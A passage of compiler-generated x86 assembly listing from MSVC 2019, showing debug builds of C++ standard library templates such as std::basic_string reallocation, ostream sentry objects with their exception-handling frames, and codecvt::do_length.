	call	??R<lambda_15711c68e099a15a58f4d77303cb286d>@@QBE@QADQBDID@Z ; <lambda_15711c68e099a15a58f4d77303cb286d>::operator()
; Line 4565
	mov	eax, DWORD PTR __Old_capacity$[ebp]
	inc	eax
	push	eax
	push	DWORD PTR __Old_ptr$1[ebp]
	mov	ecx, DWORD PTR __Al$[ebp]
	call	?deallocate@?$allocator@D@std@@QAEXQADI@Z ; std::allocator<char>::deallocate
; Line 4566
	mov	eax, DWORD PTR __My_data$[ebp]
	mov	ecx, DWORD PTR __New_ptr$[ebp]
	mov	DWORD PTR [eax], ecx
; Line 4567
	jmp	SHORT $LN4@Reallocate
$LN3@Reallocate:
; Line 4568
	push	DWORD PTR _<_Args_0>$[ebp]
	push	DWORD PTR __Old_size$[ebp]
	push	DWORD PTR __My_data$[ebp]
	push	DWORD PTR __Raw_new$[ebp]
	lea	ecx, DWORD PTR __Fn$[ebp]
	call	??R<lambda_15711c68e099a15a58f4d77303cb286d>@@QBE@QADQBDID@Z ; <lambda_15711c68e099a15a58f4d77303cb286d>::operator()
; Line 4569
	lea	eax, DWORD PTR __New_ptr$[ebp]
	push	eax
	push	DWORD PTR __My_data$[ebp]
	call	??$_Construct_in_place@PADABQAD@std@@YAXAAPADABQAD@Z ; std::_Construct_in_place<char *,char * const &>
	pop	ecx
	pop	ecx
$LN4@Reallocate:
; Line 4572
	mov	eax, DWORD PTR _this$[ebp]
$LN5@Reallocate:
; Line 4573
	leave
	ret	12					; 0000000cH
??$_Reallocate_grow_by@V<lambda_15711c68e099a15a58f4d77303cb286d>@@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_15711c68e099a15a58f4d77303cb286d>@@D@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_15711c68e099a15a58f4d77303cb286d>,char>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??R<lambda_15711c68e099a15a58f4d77303cb286d>@@QBE@QADQBDID@Z
_TEXT	SEGMENT
_this$ = -8						; size = 4
$T1 = -1						; size = 1
__New_ptr$ = 8						; size = 4
__Old_ptr$ = 12						; size = 4
__Old_size$ = 16					; size = 4
__Ch$ = 20						; size = 1
??R<lambda_15711c68e099a15a58f4d77303cb286d>@@QBE@QADQBDID@Z PROC ; <lambda_15711c68e099a15a58f4d77303cb286d>::operator(), COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xstring
; Line 3873
	push	ebp
	mov	ebp, esp
	push	ecx
	push	ecx
	mov	DWORD PTR _this$[ebp], ecx
; Line 3874
	push	DWORD PTR __Old_size$[ebp]
	push	DWORD PTR __Old_ptr$[ebp]
	push	DWORD PTR __New_ptr$[ebp]
	call	?copy@?$_Char_traits@DH@std@@SAPADQADQBDI@Z ; std::_Char_traits<char,int>::copy
	add	esp, 12					; 0000000cH
; Line 3875
	lea	eax, DWORD PTR __Ch$[ebp]
	push	eax
	mov	eax, DWORD PTR __New_ptr$[ebp]
	add	eax, DWORD PTR __Old_size$[ebp]
	push	eax
	call	?assign@?$_Narrow_char_traits@DH@std@@SAXAADABD@Z ; std::_Narrow_char_traits<char,int>::assign
	pop	ecx
	pop	ecx
; Line 3876
	mov	BYTE PTR $T1[ebp], 0
	lea	eax, DWORD PTR $T1[ebp]
	push	eax
	mov	eax, DWORD PTR __Old_size$[ebp]
	mov	ecx, DWORD PTR __New_ptr$[ebp]
	lea	eax, DWORD PTR [ecx+eax+1]
	push	eax
	call	?assign@?$_Narrow_char_traits@DH@std@@SAXAADABD@Z ; std::_Narrow_char_traits<char,int>::assign
	pop	ecx
	pop	ecx
; Line 3877
	leave
	ret	16					; 00000010H
??R<lambda_15711c68e099a15a58f4d77303cb286d>@@QBE@QADQBDID@Z ENDP ; <lambda_15711c68e099a15a58f4d77303cb286d>::operator()
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$_Destroy_in_place@PAD@std@@YAXAAPAD@Z
_TEXT	SEGMENT
__Obj$ = 8						; size = 4
??$_Destroy_in_place@PAD@std@@YAXAAPAD@Z PROC		; std::_Destroy_in_place<char *>, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xmemory
; Line 307
	push	ebp
	mov	ebp, esp
; Line 313
	pop	ebp
	ret	0
??$_Destroy_in_place@PAD@std@@YAXAAPAD@Z ENDP		; std::_Destroy_in_place<char *>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$addressof@V?$basic_fstream@DU?$char_traits@D@std@@@std@@@std@@YAPAV?$basic_fstream@DU?$char_traits@D@std@@@0@AAV10@@Z
_TEXT	SEGMENT
__Val$ = 8						; size = 4
??$addressof@V?$basic_fstream@DU?$char_traits@D@std@@@std@@@std@@YAPAV?$basic_fstream@DU?$char_traits@D@std@@@0@AAV10@@Z PROC ; std::addressof<std::basic_fstream<char,std::char_traits<char> > >, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xstddef
; Line 274
	push	ebp
	mov	ebp, esp
; Line 275
	mov	eax, DWORD PTR __Val$[ebp]
; Line 276
	pop	ebp
	ret	0
??$addressof@V?$basic_fstream@DU?$char_traits@D@std@@@std@@@std@@YAPAV?$basic_fstream@DU?$char_traits@D@std@@@0@AAV10@@Z ENDP ; std::addressof<std::basic_fstream<char,std::char_traits<char> > >
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$addressof@$$CBV?$codecvt@DDU_Mbstatet@@@std@@@std@@YAPBV?$codecvt@DDU_Mbstatet@@@0@ABV10@@Z
_TEXT	SEGMENT
__Val$ = 8						; size = 4
??$addressof@$$CBV?$codecvt@DDU_Mbstatet@@@std@@@std@@YAPBV?$codecvt@DDU_Mbstatet@@@0@ABV10@@Z PROC ; std::addressof<std::codecvt<char,char,_Mbstatet> const >, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xstddef
; Line 274
	push	ebp
	mov	ebp, esp
; Line 275
	mov	eax, DWORD PTR __Val$[ebp]
; Line 276
	pop	ebp
	ret	0
??$addressof@$$CBV?$codecvt@DDU_Mbstatet@@@std@@@std@@YAPBV?$codecvt@DDU_Mbstatet@@@0@ABV10@@Z ENDP ; std::addressof<std::codecvt<char,char,_Mbstatet> const >
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$?0$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@U_Zero_then_variadic_args_t@1@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___formal$ = 8						; size = 1
??$?0$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@U_Zero_then_variadic_args_t@1@@Z PROC ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><>, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xmemory
; Line 1390
	push	ebp
	mov	ebp, esp
	push	ecx
	mov	DWORD PTR _this$[ebp], ecx
	mov	ecx, DWORD PTR _this$[ebp]
	call	??0?$allocator@D@std@@QAE@XZ		; std::allocator<char>::allocator<char>
	mov	ecx, DWORD PTR _this$[ebp]
	call	??0?$_String_val@U?$_Simple_types@D@std@@@std@@QAE@XZ ; std::_String_val<std::_Simple_types<char> >::_String_val<std::_Simple_types<char> >
	mov	eax, DWORD PTR _this$[ebp]
	leave
	ret	4
??$?0$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@U_Zero_then_variadic_args_t@1@@Z ENDP ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$?0V?$allocator@D@std@@$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@$$QAV?$allocator@D@1@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___formal$ = 8						; size = 1
__Val1$ = 12						; size = 4
??$?0V?$allocator@D@std@@$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@$$QAV?$allocator@D@1@@Z PROC ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><std::allocator<char> >, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xmemory
; Line 1395
	push	ebp
	mov	ebp, esp
	push	ecx
	mov	DWORD PTR _this$[ebp], ecx
	push	DWORD PTR __Val1$[ebp]
	call	??$forward@V?$allocator@D@std@@@std@@YA$$QAV?$allocator@D@0@AAV10@@Z ; std::forward<std::allocator<char> >
	pop	ecx
	mov	ecx, DWORD PTR _this$[ebp]
	call	??0?$_String_val@U?$_Simple_types@D@std@@@std@@QAE@XZ ; std::_String_val<std::_Simple_types<char> >::_String_val<std::_Simple_types<char> >
	mov	eax, DWORD PTR _this$[ebp]
	leave
	ret	8
??$?0V?$allocator@D@std@@$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@$$QAV?$allocator@D@1@@Z ENDP ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$move@AAV?$allocator@D@std@@@std@@YA$$QAV?$allocator@D@0@AAV10@@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$move@AAV?$allocator@D@std@@@std@@YA$$QAV?$allocator@D@0@AAV10@@Z PROC ; std::move<std::allocator<char> &>, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\type_traits
; Line 1455
	push	ebp
	mov	ebp, esp
; Line 1456
	mov	eax, DWORD PTR __Arg$[ebp]
; Line 1457
	pop	ebp
	ret	0
??$move@AAV?$allocator@D@std@@@std@@YA$$QAV?$allocator@D@0@AAV10@@Z ENDP ; std::move<std::allocator<char> &>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??Bsentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QBE_NXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??Bsentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QBE_NXZ PROC ; std::basic_ostream<char,std::char_traits<char> >::sentry::operator bool, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\ostream
; Line 124
	push	ebp
	mov	ebp, esp
	push	ecx
	mov	DWORD PTR _this$[ebp], ecx
; Line 125
	mov	eax, DWORD PTR _this$[ebp]
	mov	al, BYTE PTR [eax+4]
; Line 126
	leave
	ret	0
??Bsentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QBE_NXZ ENDP ; std::basic_ostream<char,std::char_traits<char> >::sentry::operator bool
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -20						; size = 4
__Zero_uncaught_exceptions$ = -14			; size = 1
tv72 = -13						; size = 1
__$EHRec$ = -12						; size = 12
??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@XZ PROC ; std::basic_ostream<char,std::char_traits<char> >::sentry::~sentry, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\ostream
; Line 109
	push	ebp
	mov	ebp, esp
	push	-1
	push	__ehhandler$??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@XZ
	mov	eax, DWORD PTR fs:0
	push	eax
	push	ecx
	push	ecx
	mov	eax, DWORD PTR ___security_cookie
	xor	eax, ebp
	push	eax
	lea	eax, DWORD PTR __$EHRec$[ebp]
	mov	DWORD PTR fs:0, eax
	mov	DWORD PTR _this$[ebp], ecx
; Line 113
	call	?uncaught_exception@std@@YA_NXZ		; std::uncaught_exception
	movzx	eax, al
	test	eax, eax
	jne	SHORT $LN4@sentry
	mov	BYTE PTR tv72[ebp], 1
	jmp	SHORT $LN5@sentry
$LN4@sentry:
	mov	BYTE PTR tv72[ebp], 0
$LN5@sentry:
	mov	al, BYTE PTR tv72[ebp]
	mov	BYTE PTR __Zero_uncaught_exceptions$[ebp], al
; Line 118
	movzx	eax, BYTE PTR __Zero_uncaught_exceptions$[ebp]
	test	eax, eax
	je	SHORT $LN1@sentry
; Line 119
	mov	eax, DWORD PTR _this$[ebp]
	mov	ecx, DWORD PTR [eax]
	call	?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ ; std::basic_ostream<char,std::char_traits<char> >::_Osfx
$LN1@sentry:
; Line 121
	mov	ecx, DWORD PTR _this$[ebp]
	call	??1_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@XZ ; std::basic_ostream<char,std::char_traits<char> >::_Sentry_base::~_Sentry_base
	mov	ecx, DWORD PTR __$EHRec$[ebp]
	mov	DWORD PTR fs:0, ecx
	pop	ecx
	leave
	ret	0
	int	3
	int	3
	int	3
	int	3
	int	3
_TEXT	ENDS
;	COMDAT text$x
text$x	SEGMENT
__ehhandler$??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@XZ:
	npad	1
	npad	1
	mov	edx, DWORD PTR [esp+8]
	lea	eax, DWORD PTR [edx+12]
	mov	ecx, DWORD PTR [edx-12]
	xor	ecx, eax
	call	@__security_check_cookie@4
	mov	eax, OFFSET __ehfuncinfo$??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@XZ
	jmp	___CxxFrameHandler3
text$x	ENDS
??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@XZ ENDP ; std::basic_ostream<char,std::char_traits<char> >::sentry::~sentry
; Function compile flags: /Odsp
;	COMDAT ??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@AAV12@@Z
_TEXT	SEGMENT
__Tied$ = -20						; size = 4
_this$ = -16						; size = 4
__$EHRec$ = -12						; size = 12
__Ostr$ = 8						; size = 4
??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@AAV12@@Z PROC ; std::basic_ostream<char,std::char_traits<char> >::sentry::sentry, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\ostream
; Line 92
	push	ebp
	mov	ebp, esp
	push	-1
	push	__ehhandler$??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@AAV12@@Z
	mov	eax, DWORD PTR fs:0
	push	eax
	push	ecx
	push	ecx
	mov	eax, DWORD PTR ___security_cookie
	xor	eax, ebp
	push	eax
	lea	eax, DWORD PTR __$EHRec$[ebp]
	mov	DWORD PTR fs:0, eax
	mov	DWORD PTR _this$[ebp], ecx
	push	DWORD PTR __Ostr$[ebp]
	mov	ecx, DWORD PTR _this$[ebp]
	call	??0_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@AAV12@@Z ; std::basic_ostream<char,std::char_traits<char> >::_Sentry_base::_Sentry_base
	and	DWORD PTR __$EHRec$[ebp+8], 0
; Line 93
	mov	eax, DWORD PTR __Ostr$[ebp]
	mov	eax, DWORD PTR [eax]
	mov	ecx, DWORD PTR __Ostr$[ebp]
	add	ecx, DWORD PTR [eax+4]
	call	?good@ios_base@std@@QBE_NXZ		; std::ios_base::good
	movzx	eax, al
	test	eax, eax
	jne	SHORT $LN2@sentry
; Line 94
	mov	eax, DWORD PTR _this$[ebp]
	mov	BYTE PTR [eax+4], 0
; Line 95
	jmp	SHORT $LN1@sentry
$LN2@sentry:
; Line 98
	mov	eax, DWORD PTR __Ostr$[ebp]
	mov	eax, DWORD PTR [eax]
	mov	ecx, DWORD PTR __Ostr$[ebp]
	add	ecx, DWORD PTR [eax+4]
	call	?tie@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEPAV?$basic_ostream@DU?$char_traits@D@std@@@2@XZ ; std::basic_ios<char,std::char_traits<char> >::tie
	mov	DWORD PTR __Tied$[ebp], eax
; Line 99
	cmp	DWORD PTR __Tied$[ebp], 0
	je	SHORT $LN4@sentry
	mov	eax, DWORD PTR __Tied$[ebp]
	cmp	eax, DWORD PTR __Ostr$[ebp]
	jne	SHORT $LN3@sentry
$LN4@sentry:
; Line 100
	mov	eax, DWORD PTR _this$[ebp]
	mov	BYTE PTR [eax+4], 1
; Line 101
	jmp	SHORT $LN1@sentry
$LN3@sentry:
; Line 104
	mov	ecx, DWORD PTR __Tied$[ebp]
	call	?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@XZ ; std::basic_ostream<char,std::char_traits<char> >::flush
; Line 105
	mov	eax, DWORD PTR __Ostr$[ebp]
	mov	eax, DWORD PTR [eax]
	mov	ecx, DWORD PTR __Ostr$[ebp]
	add	ecx, DWORD PTR [eax+4]
	call	?good@ios_base@std@@QBE_NXZ		; std::ios_base::good
	mov	ecx, DWORD PTR _this$[ebp]
	mov	BYTE PTR [ecx+4], al
$LN1@sentry:
; Line 106
	or	DWORD PTR __$EHRec$[ebp+8], -1
	mov	eax, DWORD PTR _this$[ebp]
	mov	ecx, DWORD PTR __$EHRec$[ebp]
	mov	DWORD PTR fs:0, ecx
	pop	ecx
	leave
	ret	4
_TEXT	ENDS
;	COMDAT text$x
text$x	SEGMENT
__unwindfunclet$??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@AAV12@@Z$0:
	mov	ecx, DWORD PTR _this$[ebp]
	jmp	??1_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@XZ ; std::basic_ostream<char,std::char_traits<char> >::_Sentry_base::~_Sentry_base
	int	3
	int	3
	int	3
	int	3
	int	3
__ehhandler$??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@AAV12@@Z:
	npad	1
	npad	1
	mov	edx, DWORD PTR [esp+8]
	lea	eax, DWORD PTR [edx+12]
	mov	ecx, DWORD PTR [edx-12]
	xor	ecx, eax
	call	@__security_check_cookie@4
	mov	eax, OFFSET __ehfuncinfo$??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@AAV12@@Z
	jmp	___CxxFrameHandler3
text$x	ENDS
??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@AAV12@@Z ENDP ; std::basic_ostream<char,std::char_traits<char> >::sentry::sentry
; Function compile flags: /Odsp
;	COMDAT ??1_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -24						; size = 4
tv72 = -20						; size = 4
__Rdbuf$ = -16						; size = 4
__$EHRec$ = -12						; size = 12
??1_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@XZ PROC ; std::basic_ostream<char,std::char_traits<char> >::_Sentry_base::~_Sentry_base, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\ostream
; Line 78
	push	ebp
	mov	ebp, esp
	push	-1
	push	__ehhandler$??1_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@XZ
	mov	eax, DWORD PTR fs:0
	push	eax
	sub	esp, 12					; 0000000cH
	mov	eax, DWORD PTR ___security_cookie
	xor	eax, ebp
	push	eax
	lea	eax, DWORD PTR __$EHRec$[ebp]
	mov	DWORD PTR fs:0, eax
	mov	DWORD PTR _this$[ebp], ecx
; Line 79
	mov	eax, DWORD PTR _this$[ebp]
	mov	eax, DWORD PTR [eax]
	mov	DWORD PTR tv72[ebp], eax
	mov	eax, DWORD PTR tv72[ebp]
	mov	eax, DWORD PTR [eax]
	mov	ecx, DWORD PTR tv72[ebp]
	add	ecx, DWORD PTR [eax+4]
	call	?rdbuf@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEPAV?$basic_streambuf@DU?$char_traits@D@std@@@2@XZ ; std::basic_ios<char,std::char_traits<char> >::rdbuf
	mov	DWORD PTR __Rdbuf$[ebp], eax
; Line 80
	cmp	DWORD PTR __Rdbuf$[ebp], 0
	je	SHORT $LN3@Sentry_bas
; Line 81
	mov	eax, DWORD PTR __Rdbuf$[ebp]
	mov	eax, DWORD PTR [eax]
	mov	ecx, DWORD PTR __Rdbuf$[ebp]
	call	DWORD PTR [eax+8]
$LN3@Sentry_bas:
; Line 83
	mov	ecx, DWORD PTR __$EHRec$[ebp]
	mov	DWORD PTR fs:0, ecx
	pop	ecx
	leave
	ret	0
	int	3
	int	3
	int	3
	int	3
	int	3
_TEXT	ENDS
;	COMDAT text$x
text$x	SEGMENT
__ehhandler$??1_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@XZ:
	npad	1
	npad	1
	mov	edx, DWORD PTR [esp+8]
	lea	eax, DWORD PTR [edx+12]
	mov	ecx, DWORD PTR [edx-16]
	xor	ecx, eax
	call	@__security_check_cookie@4
	mov	eax, OFFSET __ehfuncinfo$??1_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@XZ
	jmp	___CxxFrameHandler3
text$x	ENDS
??1_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@XZ ENDP ; std::basic_ostream<char,std::char_traits<char> >::_Sentry_base::~_Sentry_base
; Function compile flags: /Odsp
;	COMDAT ??0_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@AAV12@@Z
_TEXT	SEGMENT
tv73 = -12						; size = 4
_this$ = -8						; size = 4
__Rdbuf$ = -4						; size = 4
__Ostr$ = 8						; size = 4
??0_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@AAV12@@Z PROC ; std::basic_ostream<char,std::char_traits<char> >::_Sentry_base::_Sentry_base, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\ostream
; Line 71
	push	ebp
	mov	ebp, esp
	sub	esp, 12					; 0000000cH
	mov	DWORD PTR _this$[ebp], ecx
	mov	eax, DWORD PTR _this$[ebp]
	mov	ecx, DWORD PTR __Ostr$[ebp]
	mov	DWORD PTR [eax], ecx
; Line 72
	mov	eax, DWORD PTR _this$[ebp]
	mov	eax, DWORD PTR [eax]
	mov	DWORD PTR tv73[ebp], eax
	mov	eax, DWORD PTR tv73[ebp]
	mov	eax, DWORD PTR [eax]
	mov	ecx, DWORD PTR tv73[ebp]
	add	ecx, DWORD PTR [eax+4]
	call	?rdbuf@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEPAV?$basic_streambuf@DU?$char_traits@D@std@@@2@XZ ; std::basic_ios<char,std::char_traits<char> >::rdbuf
	mov	DWORD PTR __Rdbuf$[ebp], eax
; Line 73
	cmp	DWORD PTR __Rdbuf$[ebp], 0
	je	SHORT $LN1@Sentry_bas
; Line 74
	mov	eax, DWORD PTR __Rdbuf$[ebp]
	mov	eax, DWORD PTR [eax]
	mov	ecx, DWORD PTR __Rdbuf$[ebp]
	call	DWORD PTR [eax+4]
$LN1@Sentry_bas:
; Line 76
	mov	eax, DWORD PTR _this$[ebp]
	leave
	ret	4
??0_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@AAV12@@Z ENDP ; std::basic_ostream<char,std::char_traits<char> >::_Sentry_base::_Sentry_base
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$addressof@V?$basic_filebuf@DU?$char_traits@D@std@@@std@@@std@@YAPAV?$basic_filebuf@DU?$char_traits@D@std@@@0@AAV10@@Z
_TEXT	SEGMENT
__Val$ = 8						; size = 4
??$addressof@V?$basic_filebuf@DU?$char_traits@D@std@@@std@@@std@@YAPAV?$basic_filebuf@DU?$char_traits@D@std@@@0@AAV10@@Z PROC ; std::addressof<std::basic_filebuf<char,std::char_traits<char> > >, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xstddef
; Line 274
	push	ebp
	mov	ebp, esp
; Line 275
	mov	eax, DWORD PTR __Val$[ebp]
; Line 276
	pop	ebp
	ret	0
??$addressof@V?$basic_filebuf@DU?$char_traits@D@std@@@std@@@std@@YAPAV?$basic_filebuf@DU?$char_traits@D@std@@@0@AAV10@@Z ENDP ; std::addressof<std::basic_filebuf<char,std::char_traits<char> > >
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$move@AAV?$basic_fstream@DU?$char_traits@D@std@@@std@@@std@@YA$$QAV?$basic_fstream@DU?$char_traits@D@std@@@0@AAV10@@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$move@AAV?$basic_fstream@DU?$char_traits@D@std@@@std@@@std@@YA$$QAV?$basic_fstream@DU?$char_traits@D@std@@@0@AAV10@@Z PROC ; std::move<std::basic_fstream<char,std::char_traits<char> > &>, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\type_traits
; Line 1455
	push	ebp
	mov	ebp, esp
; Line 1456
	mov	eax, DWORD PTR __Arg$[ebp]
; Line 1457
	pop	ebp
	ret	0
??$move@AAV?$basic_fstream@DU?$char_traits@D@std@@@std@@@std@@YA$$QAV?$basic_fstream@DU?$char_traits@D@std@@@0@AAV10@@Z ENDP ; std::move<std::basic_fstream<char,std::char_traits<char> > &>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??_G?$codecvt@DDU_Mbstatet@@@std@@MAEPAXI@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___flags$ = 8						; size = 4
??_G?$codecvt@DDU_Mbstatet@@@std@@MAEPAXI@Z PROC	; std::codecvt<char,char,_Mbstatet>::`scalar deleting destructor', COMDAT
; _this$ = ecx
	push	ebp
	mov	ebp, esp
	push	ecx
	mov	DWORD PTR _this$[ebp], ecx
	mov	ecx, DWORD PTR _this$[ebp]
	call	??1?$codecvt@DDU_Mbstatet@@@std@@MAE@XZ	; std::codecvt<char,char,_Mbstatet>::~codecvt<char,char,_Mbstatet>
	mov	eax, DWORD PTR ___flags$[ebp]
	and	eax, 1
	je	SHORT $LN2@scalar
	push	8
	push	DWORD PTR _this$[ebp]
	call	??3@YAXPAXI@Z				; operator delete
	pop	ecx
	pop	ecx
$LN2@scalar:
	mov	eax, DWORD PTR _this$[ebp]
	leave
	ret	4
??_G?$codecvt@DDU_Mbstatet@@@std@@MAEPAXI@Z ENDP	; std::codecvt<char,char,_Mbstatet>::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ?do_length@?$codecvt@DDU_Mbstatet@@@std@@MBEHAAU_Mbstatet@@PBD1I@Z
_TEXT	SEGMENT
_this$ = -16						; size = 4
__Dist$ = -12						; size = 4
$T1 = -8						; size = 4
$T2 = -4						; size = 4
___formal$ = 8						; size = 4
__First1$ = 12						; size = 4
__Last1$ = 16						; size = 4
__Count$ = 20						; size = 4
?do_length@?$codecvt@DDU_Mbstatet@@@std@@MBEHAAU_Mbstatet@@PBD1I@Z PROC ; std::codecvt<char,char,_Mbstatet>::do_length, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xlocale
; Line 778
	push	ebp
	mov	ebp, esp
	sub	esp, 16					; 00000010H
	mov	DWORD PTR _this$[ebp], ecx
; Line 782
	mov	DWORD PTR $T2[ebp], 2147483647		; 7fffffffH
	mov	eax, DWORD PTR __Last1$[ebp]
	sub	eax, DWORD PTR __First1$[ebp]
	mov	DWORD PTR $T1[ebp], eax
	lea	eax, DWORD PTR $T2[ebp]
	push	eax
	lea	eax, DWORD PTR $T1[ebp]
	push	eax
	call	??$min@H@std@@YAABHABH0@Z		; std::min<int>
	pop	ecx
	pop	ecx
	mov	eax, DWORD PTR [eax]
	mov	DWORD PTR __Dist$[ebp], eax
; Line 783
	lea	eax, DWORD PTR __Dist$[ebp]
	push	eax
	lea	eax, DWORD PTR __Count$[ebp]
	push	eax
	call	??$min@I@std@@YAABIABI0@Z		; std::min<unsigned int>
	pop	ecx
	pop	ecx
	mov	eax, DWORD PTR [eax]
; Line 784
	leave
	ret	16					; 00000010H
?do_length@?$codecvt@DDU_Mbstatet@@@std@@MBEHAAU_Mbstatet@@PBD1I@Z ENDP ; std::codecvt<char,char,_Mbstatet>::do_length
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ?do_unshift@?$codecvt@DDU_Mbstatet@@@std@@MBEHAAU_Mbstatet@@PAD1AAPAD@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___formal$ = 8						; size = 4
__First2$ = 12						; size = 4
